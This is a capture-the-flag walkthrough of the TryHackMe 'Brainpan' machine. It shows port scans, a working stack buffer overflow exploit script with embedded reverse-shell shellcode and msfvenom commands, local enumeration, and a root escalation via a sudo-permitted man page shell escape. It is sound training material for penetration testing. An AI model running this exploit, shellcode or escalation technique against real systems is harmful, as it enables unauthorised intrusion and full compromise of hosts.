https://tryhackme.com/room/brainpan

```
export IP=10.10.207.215; export MYIP=10.4.18.63
```
# nmap

## init
```
$ nmap $IP -T4 -oA nmap_init -v

PORT      STATE SERVICE
9999/tcp  open  abyss
10000/tcp open  snet-sensor-mgmt
```


## ext
```
PORT      STATE    SERVICE        VERSION
2024/tcp  filtered xinuexpansion4
2035/tcp  filtered imsldoc
2359/tcp  filtered flukeserver
7981/tcp  filtered sossd-collect
9999/tcp  open     abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD

10000/tcp open     http           SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
| http-methods: 
|_  Supported Methods: HEAD
|_http-title: Site doesn't have a title (text/html).

12345/tcp filtered netbus
13903/tcp filtered unknown
18745/tcp filtered unknown
20549/tcp filtered unknown
21485/tcp filtered unknown
23700/tcp filtered unknown
23708/tcp filtered unknown
23834/tcp filtered unknown
25156/tcp filtered unknown
25938/tcp filtered unknown
31126/tcp filtered unknown
35940/tcp filtered unknown
37893/tcp filtered unknown
38606/tcp filtered unknown
40223/tcp filtered unknown
43562/tcp filtered unknown
44996/tcp filtered unknown
45191/tcp filtered unknown
46340/tcp filtered unknown
46643/tcp filtered unknown
46784/tcp filtered unknown
47392/tcp filtered unknown
48381/tcp filtered unknown
48786/tcp filtered unknown
49062/tcp filtered unknown
52029/tcp filtered unknown
52183/tcp filtered unknown
53220/tcp filtered unknown
56607/tcp filtered unknown
57272/tcp filtered unknown
58141/tcp filtered unknown
58970/tcp filtered unknown
59658/tcp filtered unknown
60299/tcp filtered unknown
61291/tcp filtered unknown
61856/tcp filtered unknown
62575/tcp filtered unknown
63203/tcp filtered unknown
64576/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.94SVN%I=7%D=12/20%Time=65821D9F%P=x86_64-pc-linux-gnu%
SF:r(NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\
SF:|_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\
SF:x20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_
SF:\|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x
SF:20\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x
SF:20\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINP
SF:AN\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENT
SF:ER\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");

```

# tcp/9999 
## Brainpan
```
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> Password123!
                          ACCESS DENIED
```


# ffuf
```
bin                     [Status: 200, Size: 230, Words: 14, Lines: 12, Duration: 274ms]
tindex.html              [Status: 200, Size: 215, Words: 7, Lines: 9, Duration: 274ms]
```

Download `brainpan.exe` from `http://<ip>/bin` and in a windows machine run it in a debugger, like immunity debugger
Windows IP: `192.168.122.208`
kali IP: `192.168.122.142`



# buffer overflow
## Create pattern for fuzzing
```sh
msf-pattern_create -l 1000
# try with the payload generated
# get the string found in EIP; no need to convert hex to string
msf-pattern_offset -l 1000 -q <value_found_in_EIP>
```

## shell code
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f c -a x86 -b '\x00'
```
## exploit
```python
#!/usr/bin/env python3

import pwn

HOST='10.10.245.229'
PORT=9999

r = pwn.remote(HOST, PORT)
r.recvuntil(b'>> ')

buf_len = 524     # found by fuzzing using msf-pattern_offset
buffer = b'A' * buf_len

jmp_esp_address = b'\xf3\x12\x17\x31'   # found using mona script in immunity debugger

nop_slide = b'\x90' * 32

shell_code = (b"\xda\xd2\xb8\x06\xf2\xf2\xe1\xd9\x74\x24\xf4\x5e\x33\xc9"
b"\xb1\x52\x31\x46\x17\x03\x46\x17\x83\xc0\xf6\x10\x14\x30"
b"\x1e\x56\xd7\xc8\xdf\x37\x51\x2d\xee\x77\x05\x26\x41\x48"
b"\x4d\x6a\x6e\x23\x03\x9e\xe5\x41\x8c\x91\x4e\xef\xea\x9c"
b"\x4f\x5c\xce\xbf\xd3\x9f\x03\x1f\xed\x6f\x56\x5e\x2a\x8d"
b"\x9b\x32\xe3\xd9\x0e\xa2\x80\x94\x92\x49\xda\x39\x93\xae"
b"\xab\x38\xb2\x61\xa7\x62\x14\x80\x64\x1f\x1d\x9a\x69\x1a"
b"\xd7\x11\x59\xd0\xe6\xf3\x93\x19\x44\x3a\x1c\xe8\x94\x7b"
b"\x9b\x13\xe3\x75\xdf\xae\xf4\x42\x9d\x74\x70\x50\x05\xfe"
b"\x22\xbc\xb7\xd3\xb5\x37\xbb\x98\xb2\x1f\xd8\x1f\x16\x14"
b"\xe4\x94\x99\xfa\x6c\xee\xbd\xde\x35\xb4\xdc\x47\x90\x1b"
b"\xe0\x97\x7b\xc3\x44\xdc\x96\x10\xf5\xbf\xfe\xd5\x34\x3f"
b"\xff\x71\x4e\x4c\xcd\xde\xe4\xda\x7d\x96\x22\x1d\x81\x8d"
b"\x93\xb1\x7c\x2e\xe4\x98\xba\x7a\xb4\xb2\x6b\x03\x5f\x42"
b"\x93\xd6\xf0\x12\x3b\x89\xb0\xc2\xfb\x79\x59\x08\xf4\xa6"
b"\x79\x33\xde\xce\x10\xce\x89\xfa\xe0\xc2\x76\x93\xea\xe2"
b"\x96\x02\x62\x04\xcc\xd4\x22\x9f\x79\x4c\x6f\x6b\x1b\x91"
b"\xa5\x16\x1b\x19\x4a\xe7\xd2\xea\x27\xfb\x83\x1a\x72\xa1"
b"\x02\x24\xa8\xcd\xc9\xb7\x37\x0d\x87\xab\xef\x5a\xc0\x1a"
b"\xe6\x0e\xfc\x05\x50\x2c\xfd\xd0\x9b\xf4\xda\x20\x25\xf5"
b"\xaf\x1d\x01\xe5\x69\x9d\x0d\x51\x26\xc8\xdb\x0f\x80\xa2"
b"\xad\xf9\x5a\x18\x64\x6d\x1a\x52\xb7\xeb\x23\xbf\x41\x13"
b"\x95\x16\x14\x2c\x1a\xff\x90\x55\x46\x9f\x5f\x8c\xc2\xaf"
b"\x15\x8c\x63\x38\xf0\x45\x36\x25\x03\xb0\x75\x50\x80\x30"
b"\x06\xa7\x98\x31\x03\xe3\x1e\xaa\x79\x7c\xcb\xcc\x2e\x7d"
b"\xde")

payload = buffer + jmp_esp_address + nop_slide + shell_code

r.send(payload)
result = r.recvline()

r.close()
```

# low-level shell
```
puck@brainpan:/bin$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP qlen 1000
    link/ether 02:dd:0e:19:86:75 brd ff:ff:ff:ff:ff:ff
    inet 10.10.245.229/16 brd 10.10.255.255 scope global eth0
    inet6 fe80::dd:eff:fe19:8675/64 scope link 
       valid_lft forever preferred_lft forever

puck@brainpan:/bin$ ip n
10.10.0.1 dev eth0 lladdr 02:c8:85:b5:5a:aa REACHABLE

puck@brainpan:/bin$ ip r
default via 10.10.0.1 dev eth0 
10.10.0.0/16 dev eth0  proto kernel  scope link  src 10.10.245.229

puck@brainpan:/bin$ find / -type f -perm -04000 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping6
/bin/ping
/usr/bin/sudo
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudoedit
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/lppasswd
/usr/bin/passwd
/usr/bin/gpasswd
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/local/bin/validate
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown

$ cat /etc/os-release
NAME="Ubuntu"
VERSION="12.10, Quantal Quetzal"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu quantal (12.10)"
VERSION_ID="12.10"

$ uname -a
Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux


```


```
Possible private SSH keys were found!
/etc/ImageMagick/mime.xml
```
## attack vector
```
$ sudo -l
Matching Defaults entries for puck on this host:                                                            
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

# root shell
#suid #man #man_pages
The first command opens man page for ls or any other command **with root privileges** . Then we can try `!/bin/bash` which runs a command in the man page
```
$ sudo /home/anansi/bin/anansi_util manual ls
!/bin/bash
# whoami
root
```
